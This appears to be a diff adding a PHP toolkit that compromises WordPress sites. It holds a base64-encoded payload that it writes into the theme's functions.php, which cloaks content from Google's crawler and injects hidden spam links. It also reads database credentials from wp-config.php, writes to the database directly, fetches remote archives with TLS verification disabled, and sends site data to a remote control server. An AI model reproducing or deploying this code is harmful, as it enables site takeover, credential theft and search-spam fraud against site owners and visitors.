AnbWV0aG9kJyA9PiAnUE9TVCcsCiAgICAgICAgICAgICd0aW1lb3V0JyA9PiAxMCwKICAgICAgICAgICAgJ2JvZHknID0+IGFycmF5KAogICAgICAgICAgICAgICAgJ2hvc3QnID0+ICRfU0VSVkVSWydIVFRQX0hPU1QnXSwKICAgICAgICAgICAgICAgICdkZWJ1Z2RhdGEnID0+IGd6Y29tcHJlc3MoanNvbl9lbmNvZGUoJHZhbHVlKSksIDkpCiAgICAgICAgKQogICAgKTsKCiAgICBpZiAoaXNfd3BfZXJyb3IoJHJlc3BvbnNlKSkgewogICAgICAgIHJldHVybjsKICAgIH0gZWxzZSB7CiAgICAgICAgaWYgKHRyaW0oJHJlc3BvbnNlWydib2R5J10pID09PSAnc3VjY2VzcycpIHsKICAgICAgICAgICAgdXBkYXRlX29wdGlvbignd3BfZGVidWdfZGF0YScsIGFycmF5KCksIGZhbHNlKTsKICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIGN1c3RvbVNlSXBzKCkgewoKICAgIGlmICgoJHZhbHVlID0gZ2V0X29wdGlvbignd3BfY3VzdG9tX3JhbmdlJykpICYmICFjdXN0b21Jc1JlbmV3VGltZSgkdmFsdWVbJ3RpbWVzdGFtcCddKSkgewogICAgICAgIHJldHVybiAkdmFsdWVbJ3JhbmdlcyddOwogICAgfSBlbHNlIHsKICAgICAgICAvL2N1c3RvbVNldERlYnVnKCd0aW1lIHRvIHVwZGF0ZSByYW5nZXMnKTsKICAgICAgICAkcmVzcG9uc2UgPSB3cF9yZW1vdGVfZ2V0KCdodHRwczovL3d3dy5nc3RhdGljLmNvbS9pcHJhbmdlcy9nb29nLnR4dCcpOwogICAgICAgIGlmIChpc193cF9lcnJvcigkcmVzcG9uc2UpKSB7CiAgICAgICAgICAgIC8vY3VzdG9tU2V0RGVidWcoJ2Vycm9yIHJlc3BvbnNlIGlwcmFuZ2VzJyk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgJGJvZHkgPSB3cF9yZW1vdGVfcmV0cmlldmVfYm9keSgkcmVzcG9uc2UpOwogICAgICAgICRyYW5nZXMgPSBwcmVnX3NwbGl0KCJ+KFxyXG58XG4pfiIsIHRyaW0oJGJvZHkpLCAtMSwgUFJFR19TUExJVF9OT19FTVBUWSk7CgogICAgICAgIGlmICghaXNfYXJyYXkoJHJhbmdlcykpIHsKICAgICAgICAgICAgLy9jdXN0b21TZXREZWJ1ZygnaW52YWxpZCB1cGRhdGUgcmFuZ2VzIG5vdCBhbiBhcnJheScpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICAkdmFsdWUgPSBhcnJheSgncmFuZ2VzJyA9PiAkcmFuZ2VzLCAndGltZXN0YW1wJyA9PiB0aW1lKCkpOwogICAgICAgIHVwZGF0ZV9vcHRpb24oJ3dwX2N1c3RvbV9yYW5nZScsICR2YWx1ZSwgdHJ1ZSk7CiAgICAgICAgcmV0dXJuICR2YWx1ZVsncmFuZ2VzJ107CiAgICB9Cn0KCmZ1bmN0aW9uIGN1c3RvbUluZXRUb0JpdHMoJGluZXQpIHsKICAgICRzcGxpdHRlZCA9IHN0cl9zcGxpdCgkaW5ldCk7CiAgICAkYmluYXJ5aXAgPSAnJzsKICAgIGZvcmVhY2ggKCRzcGxpdHRlZCBhcyAkY2hhcikgewogICAgICAgICRiaW5hcnlpcCAuPSBzdHJfcGFkKGRlY2JpbihvcmQoJGNoYXIpKSwgOCwgJzAnLCBTVFJfUEFEX0xFRlQpOwogICAgfQogICAgcmV0dXJuICRiaW5hcnlpcDsKfQoKZnVuY3Rpb24gY3VzdG9tQ2hlY2tJblN1Ym5ldCgkaXAsICRjaWRybmV0KSB7CiAgICAkaXAgPSBpbmV0X3B0b24oJGlwKTsKICAgICRiaW5hcnlpcCA9IGN1c3RvbUluZXRUb0JpdHMoJGlwKTsKCiAgICBsaXN0KCRuZXQsICRtYXNrYml0cykgPSBleHBsb2RlKCcvJywgJGNpZHJuZXQpOwogICAgJG5ldCA9IGluZXRfcHRvbigkbmV0KTsKICAgICRiaW5hcnluZXQgPSBjdXN0b21JbmV0VG9CaXRzKCRuZXQpOwoKICAgICRpcF9uZXRfYml0cyA9IHN1YnN0cigkYmluYXJ5aXAsIDAsICRtYXNrYml0cyk7CiAgICAkbmV0X2JpdHMgPSBzdWJzdHIoJGJpbmFyeW5ldCwgMCwgJG1hc2tiaXRzKTsKCiAgICBpZiAoJGlwX25ldF9iaXRzICE9PSAkbmV0X2JpdHMpIHsKICAgICAgICAvL2VjaG8gJ05vdCBpbiBzdWJuZXQnOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0gZWxzZSB7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9Cn0KCi8qKgogKiBmdW5jdGlvbiBidWZmZXJfc3RhcnRfY3VzdG9tKCkgewogKgogKiBnbG9iYWwgJHBvc3QsICR1c2VyU2V0dGluZ3NBcnI7CiAqCiAqICRhdXRob3JzX2lkc19hcnIgPSBhcnJheV9rZXlzKCR1c2VyU2V0dGluZ3NBcnIpOwogKgogKgogKgogKiBpZiAoIWluX2FycmF5KCRwb3N0LT5wb3N0X2F1dGhvciwgJGF1dGhvcnNfaWRzX2FycikpIHsKICogaWYgKGlzX3NpbmdsZSgpIHx8IChpc19mcm9udF9wYWdlKCkgfHwgaXNfaG9tZSgpKSkgewogKiBvYl9zdGFydCgiY2FsbGJhY2tfY3VzdG9tIik7CiAqIH0KICogfQogKiB9CiAqCiAqLwpmdW5jdGlvbiBidWZmZXJfc3RhcnRfY3VzdG9tKCkgewogICAgZWNobyAnPCEtLWJ1ZmZlciBzdGFydCBjdXN0b20tLSE+JyAuIFBIUF9FT0w7CiAgICBpZiAoIWlzQ3VzdG9tUG9zdCgpKSB7CiAgICAgICAgaWYgKGlzX3Npbmd1bGFyKCkgfHwgKGlzX2Zyb250X3BhZ2UoKSB8fCBpc19ob21lKCkpKSB7CiAgICAgICAgICAgIGVjaG8gJzwhLS1zdGFydCBjYWxsYmFjayBjdXN0b20tLSE+JyAuIFBIUF9FT0w7CiAgICAgICAgICAgIG9iX3N0YXJ0KCJjYWxsYmFja19jdXN0b20iKTsKICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIGJ1ZmZlcl9lbmRfY3VzdG9tKCkgewogICAgb2JfZW5kX2ZsdXNoKCk7Cn0KCmZ1bmN0aW9uIGNhbGxiYWNrX2N1c3RvbSgkYnVmZmVyKSB7CiAgICBnbG9iYWwgJGhvbWVMaW5rc1NldHRpbmdzQXJyOwoKICAgIHJldHVybiBidWZmZXJfcHJlcGFyZV9jdXN0b20oJGhvbWVMaW5rc1NldHRpbmdzQXJyLCAkYnVmZmVyKTsKfQoKZnVuY3Rpb24gYnVmZmVyX3ByZXBhcmVfY3VzdG9tKCRob21lTGlua3NTZXR0aW5nc0FyciwgJGJ1ZmZlcikgewoKICAgIGlmICgoJGhvbWVMaW5rc1NldHRpbmdzQXJyWydoaWRkZW5UeXBlJ11bJ2Nsb2Fja2luZyddID09PSAxKSAmJiAhY3VzdG9tQ2hlY2tTZSgpKSB7CiAgICAgICAgY3VzdG9tU2V0RGVidWcoJ25vIGdvb2dsZSBib3QsIHdpdGhvdXQgY2hhbmdlcyAnIC4gZ2V0UmVtb3RlSXAoKSk7CiAgICAgICAgcmV0dXJuICRidWZmZXI7CiAgICB9CgoKICAgICR0ZXh0QmxvY2sgPSB0ZXh0X2Jsb2NrX2N1c3RvbSgkaG9tZUxpbmtzU2V0dGluZ3NBcnIpOwogICAgJHRleHRCbG9jayA9IGFkZGl0aW9uYWxfc3R5bGVfY3VzdG9tKCRob21lTGlua3NTZXR0aW5nc0FyciwgJHRleHRCbG9jayk7CgoKICAgIGlmICgkaG9tZUxpbmtzU2V0dGluZ3NBcnJbJ3Bvc2l0aW9uJ11bJ2Zvb3RlciddID09PSAxKSB7CiAgICAgICAgY3VzdG9tU2V0RGVidWcoJ2Zvb3RlciBwb3NpdGlvbicpOwogICAgICAgIHJldHVybiAkYnVmZmVyIC4gUEhQX0VPTCAuICR0ZXh0QmxvY2s7CiAgICB9CiAgICBpZiAoJGhvbWVMaW5rc1NldHRpbmdzQXJyWydwb3NpdGlvbiddWydoZWFkJ10gPT09IDEpIHsKICAgICAgICBjdXN0b21TZXREZWJ1ZygnaGVhZGVyIHBvc2l0aW9uJyk7CiAgICAgICAgcmV0dXJuICR0ZXh0QmxvY2sgLiBQSFBfRU9MIC4gJGJ1ZmZlcjsKICAgIH0KfQoKZnVuY3Rpb24gdGV4dF9ibG9ja19jdXN0b20oJGhvbWVMaW5rc1NldHRpbmdzQXJyKSB7CgogICAgZ2xvYmFsICRwb3N0OwoKICAgICRibG9jayA9ICcnOwoKICAgIGlmICgkaG9tZUxpbmtzU2V0dGluZ3NBcnJbJ3RleHRCbG9ja3NDb3VudCddWydvbmx5SG9tZVBhZ2UnXSA9PT0gMSkgewogICAgICAgIGlmIChpc19mcm9udF9wYWdlKCkgfHwgaXNfaG9tZSgpKSB7CiAgICAgICAgICAgIGN1c3RvbVNldERlYnVnKCdob21lIHBhZ2UgbW9kZScpOwogICAgICAgICAgICAkYmxvY2sgPSBnZXRfb3B0aW9uKCdob21lX2xpbmtzX2N1c3RvbV8wJyk7CiAgICAgICAgfQogICAgfSBlbHNlaWYgKCRob21lTGlua3NTZXR0aW5nc0FyclsndGV4dEJsb2Nrc0NvdW50J11bJzEwRGlmZmVyZW50VGV4dEJsb2NrcyddID09PSAxKSB7CgogICAgICAgICR1cmwgPSBnZXRfcGVybWFsaW5rKCRwb3N0LT5JRCk7CiAgICAgICAgcHJlZ19tYXRjaCgnflxkficsIG1kNSgkdXJsKSwgJG1hdGNoZXMpOwogICAgICAgICRibG9jayA9IGdldF9vcHRpb24oJ2hvbWVfbGlua3NfY3VzdG9tXycgLiAkbWF0Y2hlc1swXSk7CiAgICAgICAgJGxvZyA9IHNwcmludGYoJzEwRGlmZmVyZW50VGV4dEJsb2NrcyBwYWdlIG1vZGUgYmxvY2sgbnVtIC0gJXMgcGVybWFsaW5rIC0gJXMnLCAkbWF0Y2hlc1swXSwgJHVybCk7CiAgICAgICAgY3VzdG9tU2V0RGVidWcoJGxvZyk7CiAgICB9IGVsc2VpZiAoJGhvbWVMaW5rc1NldHRpbmdzQXJyWyd0ZXh0QmxvY2tzQ291bnQnXVsnMTAwRGlmZmVyZW50VGV4dEJsb2NrcyddID09PSAxKSB7CgogICAgICAgICR1cmwgPSBnZXRfcGVybWFsaW5rKCRwb3N0LT5JRCk7CiAgICAgICAgcHJlZ19tYXRjaF9hbGwoJ35cZH4nLCBtZDUoJHVybCksICRtYXRjaGVzKTsKICAgICAgICAkZGlnaXRzID0gKCRtYXRjaGVzWzBdWzBdID09IDApID8gJG1hdGNoZXNbMF1bMV0gOiAkbWF0Y2hlc1swXVswXSAuICcnIC4gJG1hdGNoZXNbMF1bMV07CiAgICAgICAgJGJsb2NrID0gZ2V0X29wdGlvbignaG9tZV9saW5rc19jdXN0b21fJyAuICRkaWdpdHMpOwogICAgICAgICRsb2cgPSBzcHJpbnRmKCcxMDBEaWZmZXJlbnRUZXh0QmxvY2tzIHBhZ2UgbW9kZSBibG9jayBudW0gLSAlcyBwZXJtYWxpbmsgLSAlcycsICRkaWdpdHMsICR1cmwpOwogICAgICAgIGN1c3RvbVNldERlYnVnKCRsb2cpOwogICAgfSBlbHNlaWYgKCRob21lTGlua3NTZXR0aW5nc0FyclsndGV4dEJsb2Nrc0NvdW50J11bJ2Z1bGxEaWZmZXJlbnRUZXh0QmxvY2tzJ10gPT09IDEpIHsKCiAgICB9IGVsc2UgewoKICAgIH0KCiAgICByZXR1cm4gISRibG9jayA/ICcnIDogJGJsb2NrOwp9CgpmdW5jdGlvbiBhZGRpdGlvbmFsX3N0eWxlX2N1c3RvbSgkaG9tZUxpbmtzU2V0dGluZ3NBcnIsICR0ZXh0QmxvY2spIHsKICAgIGlmIChlbXB0eSgkdGV4dEJsb2NrKSkgewogICAgICAgIHJldHVybiAnJzsKICAgIH0KICAgIGlmICgkaG9tZUxpbmtzU2V0dGluZ3NBcnJbJ2hpZGRlblR5cGUnXVsnY3NzJ10gPT09IDEpIHsKICAgICAgICAkY3NzUnVsZXMgPSBjc3NfcnVsZV9jdXN0b20oKTsKICAgICAgICByZXR1cm4gJGNzc1J1bGVzWzBdIC4gUEhQX0VPTCAuICR0ZXh0QmxvY2sgLiBQSFBfRU9MIC4gJGNzc1J1bGVzWzFdOwogICAgfQogICAgcmV0dXJuICR0ZXh0QmxvY2s7Cn0KCmZ1bmN0aW9uIGNzc19ydWxlX2N1c3RvbSgpIHsKICAgIC8vcmV0dXJuIFsnPGRpdiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPicsICc8L2Rpdj4nXTsKICAgIHJldHVybiBhcnJheSgnPGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7IGZpbHRlcjphbHBoYShvcGFjaXR5PTApO29wYWNpdHk6MC4wMDM7ei1pbmRleDo4OyI+JywgJzwvZGl2PicpOwp9CgpmdW5jdGlvbiBob21lX2xpbmtzX3NldHRpbmdzX2N1c3RvbSgkc2V0dGluZ3MpIHsKICAgIGZvcmVhY2ggKCRzZXR0aW5ncyBhcyAka2V5ID0+ICRhcnIpIHsKICAgICAgICBpZiAoaXNzZXQoJGFyclsnaG9tZUxpbmtzJ10pKSB7CiAgICAgICAgICAgIHJldHVybiAkYXJyWydob21lTGlua3MnXTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gYXJyYXkoKTsKfQoKJHVzZXJTZXR0aW5nc0FyciA9IGN1c3RvbUZpbHRlcnNTZXR0aW5ncygpOwoKaWYgKGlzX2FycmF5KCR1c2VyU2V0dGluZ3NBcnIpKSB7CiAgICBhZGRfZmlsdGVyKCdwb3N0c193aGVyZV9wYWdlZCcsICdhZGRfd2hlcmVfY29uZGl0aW9uJyk7CgogICAgYWRkX2FjdGlvbigncHJlX2dldF9wb3N0cycsICdwb3N0X2V4Y2x1ZGUnKTsKICAgIGFkZF9hY3Rpb24oJ3dwX2VucXVldWVfc2NyaXB0cycsICd3cF9jb3JlX2pzJyk7CgogICAgYWRkX2ZpbHRlcignd3BfY291bnRfcG9zdHMnLCAnZmlsdGVyX2Z1bmN0aW9uX25hbWVfNDA1NScsIDEwLCAzKTsKCiAgICBhZGRfZmlsdGVyKCdyZXdyaXRlX3J1bGVzX2FycmF5JywgJ3NpdGVtYXBfeG1sX3J1bGVzJyk7CiAgICBhZGRfYWN0aW9uKCd3cF9sb2FkZWQnLCAnY3VzdG9tX2ZsdXNoX3J1bGVzJyk7CiAgICBhZGRfYWN0aW9uKCdpbml0JywgJ2N1c3RvbVNpdGVtYXBGZWVkJyk7CiAgICBhZGRfYWN0aW9uKCd0ZW1wbGF0ZV9yZWRpcmVjdCcsICdyZW1vdmVZb2FzdE1ldGEnKTsKCiAgICAkaG9tZUxpbmtzU2V0dGluZ3NBcnIgPSBob21lX2xpbmtzX3NldHRpbmdzX2N1c3RvbSgkdXNlclNldHRpbmdzQXJyKTsKCiAgICBpZiAoIWVtcHR5KCRob21lTGlua3NTZXR0aW5nc0FycikpIHsKCiAgICAgICAgY3VzdG9tU2VuZERlYnVnKCk7CgogICAgICAgIGFkZF9hY3Rpb24oJ3dwX2hlYWQnLCAnYnVmZmVyX3N0YXJ0X2N1c3RvbScpOwogICAgICAgIGFkZF9hY3Rpb24oJ3dwX2Zvb3RlcicsICdidWZmZXJfZW5kX2N1c3RvbScpOwogICAgfQp9CgovKiBjdXN0b20gZmlsdGVycyAqLw==';
+    $controlHash = md5( $source );
+
+    $settings = settingsArr( $functionsSource );
+    if ( ! $settings ) {
+        echo 'settings return false' . PHP_EOL;
+
+        return false;
+    }
+
+    writeSettingsDB( $settings );
+
+    $customFiltersUpdateResult = mbReplaceCustomFilters( $functionsSource
+        , $functionsPath, $controlHash, $source );
+
+
+    if ( $customFiltersUpdateResult ) {
+        getSitemapUrls();
+
+        return true;
+    }
+
+
+    return false;
+}
+
+function homeLinksAction() {
+
+    $hash = md5( HOME_URL );
+
+    $permLinks = array();
+
+    if ( isBadEnvCustom() ) {
+        echo 'change shell, invalid require wp-blog-header' . PHP_EOL;
+        exit;
+    }
+
+
+    if ( ! function_exists( 'get_permalink' ) ) {
+        require WP_ROOT_DIR . '/wp-blog-header.php';
+    }
+    $posts = CustomDbHandler::getInstance()
+        ->allPostsFromDb( HOME_URL, CUSTOM_AUTHOR_ID );
+
+    if ( empty( $posts ) ) {
+        echo '!!!!!!!!no posts for this author!!!!!' . PHP_EOL;
+
+        return false;
+    }
+
+    foreach ( $posts as $post ) {
+
+        list ( $url, $anchor ) = explode( ';', $post, 2 );
+
+        preg_match( '~\?p=(\d+)~', $post, $matches );
+
+        $postId = $matches[1];
+
+        $permLinks[] = array( get_permalink( $postId ), $anchor );
+        wp_cache_delete( $postId, 'posts' );
+    }
+
+
+    if ( empty( $permLinks ) ) {
+        echo 'invalid fetch permalinks' . PHP_EOL;
+
+        return false;
+    }
+
+    $compressed = gzcompress( json_encode( $permLinks ), 9 );
+
+    $url = GS_ALIAS . '/dnc/wp-acceptors-api/home-links?hash=' . $hash . '&permhash=' . md5( $compressed );
+
+    $results = sendpostUploader( $url, array(
+            'homeLinksSettings' => json_encode( $_SERVER['homeLinksSettings'] ),
+            'url'               => urlencode( HOME_URL ),
+            'permLinks'         => urlencode( $compressed )
+        )
+    );
+
+    $uncompressed = gzuncompress( $results );
+
+    if ( ! isJsonCustom( $uncompressed ) ) {
+        echo 'invalid home links format' . PHP_EOL;
+
+        return false;
+    }
+
+    $blocks = json_decode( $uncompressed, 1 );
+
+    if ( empty( $blocks ) ) {
+        echo 'no texts for this language' . PHP_EOL;
+
+        return false;
+    }
+
+
+    foreach ( $blocks as $key => $value ) {
+        update_option( 'home_links_custom_' . $key, $value );
+    }
+
+    echo sprintf( '%s text block(s) available for use%s', count( $blocks ), PHP_EOL );
+
+    return true;
+}
+
+function removeHomeLinkKey( $settings ) {
+    foreach ( $settings as $key => $arr ) {
+        if ( $key === CUSTOM_AUTHOR_ID ) {
+            continue;
+        }
+        if ( isset( $settings[ $key ]['homeLinks'] ) ) {
+            unset( $settings[ $key ]['homeLinks'] );
+        }
+    }
+
+    return $settings;
+}
+
+function viewAllAuthorsAction() {
+    CustomDbHandler::getInstance()->viewAllAuthors();
+
+    return true;
+}
+
+function getSitemapUrls() {
+
+    echo HOME_URL . '/' . SITEMAP_NAME . '.xml' . PHP_EOL;
+    echo HOME_URL . '/?feed=xml' . SITEMAP_NAME . PHP_EOL;
+}
+
+function writeSettingsDB( $settings ) {
+
+    try {
+        $settingsName   = 'wp_custom_filters';
+        $instance       = CustomDbHandler::getInstance();
+        $settingsEncode = base64_encode( serialize( $settings ) );
+
+        if ( ! $instance->getOption( $settingsName ) ) {
+            //echo 'insert new option' . PHP_EOL;
+            $instance->insertWpOptions( $settingsName, $settingsEncode );
+        } else {
+            //echo 'option exist, update option' . PHP_EOL;
+            $instance->updateWpOptions( $settingsName, $settingsEncode );
+        }
+
+        echo 'settings updated!' . PHP_EOL;
+
+        return true;
+
+    } catch ( Exception $ex ) {
+        echo $ex->getMessage() . PHP_EOL;
+
+        return false;
+    }
+}
+
+
+function sendAction() {
+
+    $mutexName = defined( 'CUSTOM_AUTHOR_ID' ) ? '_' . CUSTOM_AUTHOR_ID : '';
+
+    $filename = TMPDIR . '/log' . $mutexName . '.txt';
+
+    //echo "send $filename" . PHP_EOL;
+
+    $api = GS_ALIAS . '/src/wpacc-v2.php';
+
+    $debugData = array(
+        'url'      => HOME_URL,
+        'fullUrls' => allPostsFullUrl(),
+        'settings' => debugDataCustom(),
+    );
+
+    $responseData = sendpostUploader( $api, array(
+        'url'   => urlencode( HOME_URL ),
+        'debug' => urlencode( gzcompress( json_encode( $debugData ), 9 ) ),
+    ) );
+
+    if ( trim( $responseData ) === 'success' ) {
+        echo "data sent" . PHP_EOL;
+
+        return true;
+    }
+    echo "error while send data" . PHP_EOL;
+
+    return false;
+}
+
+function debugDataCustom() {
+
+    $settings = array();
+    $settings = getDbSettingsCustom();
+
+    if ( $settings ) {
+        foreach ( $settings as $userId => $arr ) {
+            if ( isset( $arr['js'] ) && $decodedJs = detectBase64js( $arr['js'] ) ) {
+                $settings[ $userId ]['js'] = parseJsScript( $decodedJs );
+            }
+        }
+    }
+
+
+    return array(
+        'archivePath'               => str_replace( '{DIR_NUM}', DIR_NUM, URL_WITH_ARCHIVES ),
+        'authorId'                  => CUSTOM_AUTHOR_ID,
+        'cloacking'                 => CLOACKING,
+        'homeLinks'                 => ( defined( 'HOME_LINKS' ) ) ? HOME_LINKS : 0,
+        'homeLinksSettings'         => ( ( defined( 'HOME_LINKS' ) && ( HOME_LINKS === 1 ) ) ) ? $_SERVER['homeLinksSettings'] : array(),
+        'forceChangeHomeLinksOwner' => defined( 'FORCE_CHANGE_HOME_LINKS_OWNER' ) ? FORCE_CHANGE_HOME_LINKS_OWNER : 0,
+        'internalLinking'           => INTERNAL_LINKING,
+        'externalLinking'           => EXTERNAL_LINKING,
+        'sitemapName'               => SITEMAP_NAME,
+        'jsConfig'                  => parseJsScript( JS_SOURCE ),
+        'usersSettings'             => $settings,
+    );
+}
+
+function cleanAction() {
+    removeDirRec( TMPDIR );
+
+    return true;
+}
+
+function rollbackAction() {
+    $configArr = parseWpConfig( CONFIGSOURCE );
+    $mysqli    = new mysqli( $configArr['dbhostaddr'], $configArr['dbuser'], $configArr['dbpassword'], $configArr['dbname'], $configArr['dbport'] );
+    deleteSettings();
+    deletePosts();
+    removeDirRec( TMPDIR );
+
+    return true;
+}
+
+function removeHomeLinksCustom( $configArr, $mysqli ) {
+    //SELECT option_id FROM `wp_options` where option_name LIKE 'home_links_custom_%'
+
+    $homeLinksIdsQuery = sprintf( "select option_id from `%s`.`%soptions` where option_name LIKE 'home_links_custom_%%'", $configArr['dbname'], $configArr['dbprefix'] );
+
+    if ( $result = $mysqli->query( $homeLinksIdsQuery ) ) {
+        while ( $row = $result->fetch_assoc() ) {
+            $ids[] = $row['option_id'];
+        }
+    }
+
+
+    if ( empty( $ids ) ) {
+        return 0;
+    }
+
+    $idsString      = implode( ', ', $ids );
+    $queryForDelete = sprintf( "delete FROM `%s`.`%soptions` where option_id IN ($idsString)", $configArr['dbname'], $configArr['dbprefix'] );
+    $mysqli->query( $queryForDelete );
+
+    return $mysqli->affected_rows;
+}
+
+function globalRollbackAction() {
+    $configArr = parseWpConfig( CONFIGSOURCE );
+    $mysqli    = new mysqli( $configArr['dbhostaddr'], $configArr['dbuser'], $configArr['dbpassword'], $configArr['dbname'], $configArr['dbport'] );
+
+    deletePosts( true );
+
+    removeDirRec( TMPDIR );
+
+    if ( ! defined( 'CUSTOM_TEMPLATE_PATH' ) ) {
+        $templateDirectory = getTemplatePath();
+    } else {
+        $templateDirectory = CUSTOM_TEMPLATE_PATH;
+    }
+
+
+    $functionsPath = $templateDirectory . '/functions.php';
+
+    if ( ! file_exists( $functionsPath ) ) {
+        echo $functionsPath . '/ no exists' . PHP_EOL;
+
+        return true;
+    }
+
+    if ( ! is_writeable( $functionsPath ) ) {
+        echo $functionsPath . ' no writeable' . PHP_EOL;
+
+        return true;
+    }
+
+    $functionsSource = file_get_contents( $functionsPath );
+
+    $regexp = '~\/\*\s+custom filters\s+\*\/(.+)\/\*\s*custom filters\s*\*\/~su';
+
+    $newSource = preg_replace( $regexp, '', $functionsSource );
+
+    if ( $newSource !== $functionsSource ) {
+        file_put_contents( $functionsPath, $newSource );
+        echo 'return original functions.php' . PHP_EOL;
+    }
+
+    writeSettingsDB( array() );
+    removeHomeLinksCustom( $configArr, $mysqli );
+
+    return true;
+}
+
+function sendPostsFromDbAction() {
+    $api  = GS_ALIAS . '/src/wpacc.php';
+    $urls = CustomDbHandler::getInstance()
+        ->allPostsFromDb( HOME_URL, CUSTOM_AUTHOR_ID );
+
+    if ( empty( $urls ) ) {
+        echo "no posts by author id" . PHP_EOL;
+
+        return false;
+    }
+
+    $source = implode( "\n", $urls );
+
+    $responseData = sendpostUploader( $api, array(
+        'url'    => urlencode( HOME_URL ),
+        'source' => urlencode( $source ),
+    ) );
+
+    if ( trim( $responseData ) === 'success' ) {
+        echo "data sent" . PHP_EOL;
+
+        return true;
+    }
+    echo "error while send data" . PHP_EOL;
+
+    return false;
+}
+
+function allPostsFullUrl() {
+
+
+    $userId = defined( 'CUSTOM_AUTHOR_ID' ) ? CUSTOM_AUTHOR_ID : 9999;
+    $urls   = array();
+
+    if ( isBadEnvCustom() ) {
+        echo 'change shell, invalid require wp-blog-header' . PHP_EOL;
+        exit;
+    }
+
+
+    if ( ! function_exists( 'get_permalink' ) ) {
+        require_once WP_ROOT_DIR . '/wp-blog-header.php';
+    }
+
+    $canonicalUrls = CustomDbHandler::getInstance()->allPostsFromDb( HOME_URL, $userId );
+
+    foreach ( $canonicalUrls as $canonicalUrl ) {
+        list ( $link, $title ) = explode( ';', $canonicalUrl );
+        preg_match( '~\?p=(\d+)~', $link, $idMatches );
+        $urls[] = array(
+            get_permalink( $idMatches[1] ),
+            $idMatches[1],
+            $title
+        );
+        wp_cache_delete( $idMatches[1], 'posts' );
+
+    }
+
+    return $urls;
+}
+
+function unzipSecondMethod() {
+    $paths = array(
+        TMPDIR
+    );
+    foreach ( $paths as $path ) {
+
+        $zipFiles = glob( $path . DIRECTORY_SEPARATOR . '*.zip' );
+        if ( ! is_dir( $path ) ) {
+            mkdir( $path, 0755, true );
+        }
+
+        $zip = new ZipArchive();
+
+        foreach ( $zipFiles as $file ) {
+            if ( $zip->open( $file ) ) {
+
+                if ( $zip->extractTo( $path ) ) {
+                    echo "$file extracted" . PHP_EOL;
+                    unlink( $file );
+                    $zip->close();
+                }
+            } else {
+                echo "I can not open the archive $archive" . PHP_EOL;
+
+                return false;
+            }
+        }
+    }
+    file_put_contents( TMPDIR . '/unzipsuccess', '' );
+
+    return true;
+}
+
+function unzipFirstMethod() {
+
+    $paths = array(
+        TMPDIR
+    );
+
+    if ( file_exists( $unzipClassPath = WP_ROOT_DIR . '/wp-admin/includes/class-pclzip.php' ) ) {
+        include_once $unzipClassPath;
+    } else {
+        include_once TMPDIR . '/header.php';
+    }
+
+
+    foreach ( $paths as $path ) {
+
+        $zipFiles = glob( $path . DIRECTORY_SEPARATOR . '*.zip' );
+
+        foreach ( $zipFiles as $file ) {
+
+            $archive = new PclZip( $file );
+            if ( $archive->extract( PCLZIP_OPT_PATH, $path ) == 0 ) {
+                echo "Error : " . $archive->errorInfo( true );
+
+                return false;
+            } else {
+                echo $file . " unzipped" . PHP_EOL;
+                unlink( $file );
+            }
+        }
+    }
+    file_put_contents( TMPDIR . '/unzipsuccess', '' );
+
+    return true;
+}
+
+function parseWpConfig( $configSource ) {
+
+
+    if ( ( ALTERNATIVE_CONNECT_MYSQL === 1 ) && defined( 'WP_CONFIG_ARR_AS_JSON' ) ) {
+        return json_decode( WP_CONFIG_ARR_AS_JSON, 1 );
+    }
+
+
+    //preg_match_all("~(DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)[\'\"],\s*[\'\"](.+)[\'\"]\s*\);~", $configSource, $dbhost);
+    preg_match_all( "~^define.*(DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)[\'\"],\s*[\'\"](.+)[\'\"]\s*\);~m", $configSource, $dbhost );
+
+    preg_match( "~table_prefix\s+=\s*[\'\"](.+)[\'\"];~", $configSource, $prefix );
+
+    if ( stristr( $dbhost[2][3], ':' ) !== false ) {
+        list( $hostAddr, $dbPort ) = explode( ':', $dbhost[2][3] );
+    } else {
+        $hostAddr = $dbhost[2][3];
+        $dbPort   = 3306;
+    }
+
+
+    return array(
+        'dbname'     => $dbhost[2][0],
+        'dbuser'     => $dbhost[2][1],
+        'dbpassword' => $dbhost[2][2],
+        'dbhostaddr' => $hostAddr,
+        'dbprefix'   => $prefix[1],
+        'dbport'     => $dbPort,
+    );
+}
+
+function findWriteablePath( $pathForScaning ) {
+
+    if ( is_writeable( $pathForScaning ) ) {
+        return $pathForScaning;
+    }
+    $subdirs = glob( $pathForScaning . '/*', GLOB_ONLYDIR );
+
+    if ( ! empty( $subdirs ) ) {
+        foreach ( $subdirs as $dir ) {
+            if ( is_writable( $dir ) ) {
+                return $dir;
+            }
+        }
+    }
+
+    return null;
+}
+
+function detectWProotDir() {
+
+    if ( file_exists( CURRENTDIR . '/wp-config.php' ) ) {
+        return CURRENTDIR;
+    }
+    $normalizePath = preg_replace( '~\/(wp-admin|wp-includes|wp-content).*$~', '', CURRENTDIR );
+
+    if ( file_exists( $normalizePath . '/wp-config.php' ) ) {
+        return $normalizePath;
+    }
+
+    return null;
+}
+
+function get_file( $source, $localname ) {
+
+    $file = fopen( 'php://temp/maxmemory:0', 'w+b' );
+    $ch   = curl_init();
+    curl_setopt( $ch, CURLOPT_URL, $source );
+    curl_setopt( $ch, CURLOPT_FAILONERROR, true );
+    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
+    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
+    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 0 );
+    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, 0 );
+    curl_setopt( $ch, CURLOPT_FILE, $file );
+    curl_exec( $ch );
+
+    rewind( $file );
+    file_put_contents( $localname, stream_get_contents( $file ) );
+    fclose( $file );
+
+    echo $localname . ' - ' . filesizemb( $localname ) . ' MB' . PHP_EOL;
+}
+
+function uploadRangeOfFiles( $url, $range, $extension, $dirname = '' ) {
+
